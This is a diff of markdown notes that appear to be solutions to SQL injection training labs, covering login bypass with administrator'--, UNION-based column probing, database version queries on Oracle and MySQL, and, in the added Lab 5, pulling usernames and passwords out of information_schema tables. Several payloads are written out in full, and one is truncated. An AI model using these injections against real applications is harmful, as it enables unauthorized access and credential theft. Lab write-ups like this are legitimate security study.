@@ -14,7 +14,7 @@
 
 2. Use ' OR 1=1-- to show all values = 1.
 
-**Result:** Interface shows all data, include, hidden data.
+*Result:* Interface shows all data, include, hidden data.
 ------------------------------------------------------------
 #SQL Lab 2 - Login Bypass.
 
@@ -27,7 +27,7 @@
 2. Use administrator'-- as username value to log in as administrator user. 
 csrf=3TLWN8ZvFozxYt7SjEnHCylFECivXhjq&username=administrator'-- &password=test
 
-**Results:**  We are log in as administrator user.
+*Results:*  We are log in as administrator user.
 ------------------------------------------------------------
 
 #SQL Lab 3 - Querying the database type and version on Oracle.
@@ -36,7 +36,6 @@ csrf=3TLWN8ZvFozxYt7SjEnHCylFECivXhjq&username=administrator'-- &password=test
 **End Goal:** Display the database version string.
 
 **Analisys:**
-
 1. Determine the number of columns.
 ' order by 1-- -> 200 OK
 ' order by 2-- -> 200 OK
@@ -51,7 +50,7 @@ csrf=3TLWN8ZvFozxYt7SjEnHCylFECivXhjq&username=administrator'-- &password=test
 ' UNION SELECT banner, NULL FROM v$version--
 
 
-**Results:** Interface shows database version.
+*Results:* Interface shows database version.
 ---------------------------------------------------------
 
 #SQL Lab 4 - Querying the database type and version on MySql and Microsoft.
@@ -60,7 +59,6 @@ csrf=3TLWN8ZvFozxYt7SjEnHCylFECivXhjq&username=administrator'-- &password=test
 **End Goal:** Display database type and version string.
 
 **Analisys:**
-
 1. Determine the number of columns.
 ' order by 1-- -> 200 OK
 ' order by 2-- -> 200 OK
@@ -74,7 +72,50 @@ csrf=3TLWN8ZvFozxYt7SjEnHCylFECivXhjq&username=administrator'-- &password=test
 3. Outpout the database type and version.
 '+UNION+SELECT+@@version,+NULL#
 
-**Results:** Interface shows database type and version.
+*Results:* Interface shows database type and version.
 ------------------------------------------------------------
+
+#SQL Lab 5 - Retrive data from other tables.
+
+##SQL Injection = 
+**End Goal:** Listing the database contents on non-oracle databases.
+
+**Analisys:**
+1. Determine the number of columns that are being returned and which columns contain text data.
+' UNION SELECT 'abc','def'--
+
+2. Retrieve the list of tables in the database to find the table containing user credentials.
+'+UNION+SELECT+table_name,+NULL+FROM+information.
+
+3. Retrieve the details of the columns in the table using the following payload.
+'+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='users_abcdef'--
+
+users_ussktm
+
+4. Retrieve the details of the columns in the table using the following payload:
+
+
+'+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='users_abcdef'--
+
+4.1. Find the names of the columns containing usernames and passwords.
+
+username_uakwia
+password_resgsf
+
+5. Retrieve the usernames and passwords for all users using the following payload:
+
+'+UNION+SELECT+username_abcdef,+password_abcdef+FROM+users_abcdef--
+
+5.1. Find the password for the administrator user and log in. 
+
+*Result:* Log in as administrator user.
+---------------------------------------------------------------------------------------------------------
+
+
+
+
+
+
+
 
 
